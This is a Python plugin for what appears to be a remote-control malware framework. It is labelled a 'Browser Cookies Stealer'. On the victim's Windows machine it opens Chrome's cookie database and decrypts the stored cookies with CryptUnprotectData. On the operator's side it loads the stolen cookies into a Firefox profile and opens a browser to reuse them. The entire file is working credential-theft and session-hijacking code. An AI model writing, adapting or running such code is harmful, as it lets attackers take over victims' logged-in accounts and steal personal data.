plugin_name = r"""cookieStealer"""
plugin_description = r"""Browser Cookies Stealer"""
r_source = r"""
import sqlite3
import win32crypt
# Chrome Stealer
PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
connection = sqlite3.connect(PathName)
sessions = []
with connection:
    cursor = connection.cursor()
    v = cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    values = v.fetchall()
    for info in values:
        host = info[0]
        name = info[1]
        value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
        sessions.append({
                'domain': host,
                'name': name,
                'value': value,
            })
mprint = sessions
"""
l_source = r"""
# Chrome Cookies Stealer
import ast
import threading
cookies = ast.literal_eval(mprint)
def chrome_sessions(cookies, client_id, assets):
    from selenium import webdriver
    from selenium.webdriver.firefox.webdriver import FirefoxProfile
    from selenium.webdriver.common.keys import Keys
    import shutil
    import sqlite3
    import sys
    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{}'.format(client_id))
    path_to_cookies = os.path.join(path_to_profile, 'cookies.sqlite')
    default_cookies_path = os.path.join(assets, 'cookies.sqlite')
    if not os.path.exists(path_to_profile):
        os.makedirs(path_to_profile)
    shutil.copy2(default_cookies_path, path_to_cookies)
    with sqlite3.connect(path_to_cookies) as connection:
        print 'aq'
        cursor = connection.cursor()
        l = 0
        for cookie in cookies:
            print l
            l+=1
            v = cursor.execute('INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
            (None,None,None,cookie['name'],cookie['value'],None,cookie['domain'],None,None,None,None,None,None,None))
            connection.commit()
        print 'aq2'
    print '3'
    profile = FirefoxProfile(path_to_profile)
    driver_chrome = webdriver.Firefox(profile)
    print '4'
chrome_threading = threading.Thread(target=chrome_sessions, args=(cookies, client_id, assets))
chrome_threading.start()
"""